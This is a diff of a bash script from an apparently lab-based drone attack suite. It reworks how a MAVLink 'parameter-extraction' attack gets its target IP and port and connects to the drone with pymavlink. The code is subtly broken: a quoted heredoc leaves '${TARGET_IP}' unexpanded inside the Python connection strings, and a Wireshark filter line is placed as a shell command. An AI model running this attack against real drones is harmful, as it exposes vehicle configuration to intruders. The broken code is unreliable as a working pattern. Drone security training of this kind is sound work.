@@ -4,42 +4,21 @@
 # NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 
 # MTD_INTERFACE_START
-# ==========================================================
-# MTD-aware Target Acquisition & Logging Setup
-# ==========================================================
-SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
-PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../..")
+# =======================================================================
+# MTD-aware Target Acquisition (from Orchestrator Environment)
+# =======================================================================
+# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
+# 설정될 것을 기대하고 실행됩니다.
 
-# --- Python Module Path FIX ---
-# 파이썬이 우리 모듈을 찾을 수 있도록 프로젝트 루트를 PYTHONPATH에 추가합니다.
-export PYTHONPATH="${PROJECT_ROOT}:${PYTHONPATH}"
-
-# MTD 타겟 조회
-pushd "$PROJECT_ROOT" > /dev/null
-# MTD 인터페이스 모듈 직접 실행
-TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
-POP_RESULT=$?
-popd > /dev/null
-
-if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
-    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
+if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
+    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
+    echo "This script must be run via the attack_orchestrator.py" >&2
     exit 1
 fi
 
-TARGET_IP=$(echo "$TARGET_ADDR" | cut -d: -f1)
-TARGET_PORT=14550 # SITL의 기본 UDP 포트
-
-# 중앙 로거 함수 정의
-log() {
-    printf '[%(%F_T)T] %s\n' -1 "$*"
-    EVENT_TYPE=$1
-    shift
-    EVENT_DATA_STR="$*"
-    pushd "$PROJECT_ROOT" > /dev/null
-    python3 -c 'from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; import sys; log_bus_event(sys.argv[1], {"message": sys.argv[2]})' "$EVENT_TYPE" "$EVENT_DATA_STR"
-    popd > /dev/null
-}
+echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
 # MTD_INTERFACE_END
+
 set -euo pipefail
 
 # 기준 경로 (요구사항)
@@ -48,6 +27,7 @@ export BASE="${BASE:-$PWD}"
 # 공통 로그 연결(선택사항) - 존재 시 로드
 if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
   DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
+  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
 fi
 
 log "[ATTACK] id=parameter-extraction src=Parameter-Extraction.md"
@@ -55,11 +35,11 @@ log "[BLOCK 1] type=shell"
 mavlink.message.name == "PARAM_VALUE"
 
 log "[BLOCK 2] type=python"
-python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
+python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
 # --- argv glue for converter ---
 import os, sys, re
 if len(sys.argv) <= 1:
-    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
+    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
     if ep.startswith('udp:'):
         try:
             _, rest = ep.split(':', 1)
@@ -71,7 +51,7 @@ if len(sys.argv) <= 1:
         sys.argv = [sys.argv[0], ep]
 from pymavlink import mavutil
 
-master = mavutil.mavlink_connection('tcp:10.13.0.3:5760')
+master = mavutil.mavlink_connection('tcp:${TARGET_IP}:5760')
 master.wait_heartbeat()
 print("[+] Connected")
 
